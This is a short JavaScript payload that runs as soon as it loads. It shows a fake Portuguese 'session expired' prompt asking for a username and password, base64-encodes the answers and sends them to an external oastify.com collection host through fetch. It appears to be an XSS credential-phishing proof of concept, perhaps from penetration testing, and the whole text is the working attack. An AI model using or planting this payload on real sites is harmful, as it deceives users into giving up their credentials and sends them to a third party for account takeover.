function sendRequestWithBasicAuth() {
    var username = prompt("Sessão Expirada! Por favor, insira seu nome de usuário:");
    var password = prompt("Por favor, insira sua senha:");
    if (username === null || password === null) {
        return;
    }
    var credentials = btoa(username + ':' + password);
    var url = 'http://iwi9clrcaa4whhu1brd3xojxwo2fq6ev.oastify.com/log?x=' + credentials;
    fetch(url, {
        mode: 'no-cors',
    })
    .then(response => {
        if (response.ok) {
        } else {
        }
    })
    .then(data => {
    })
    .catch(error => {
    });
}
sendRequestWithBasicAuth();
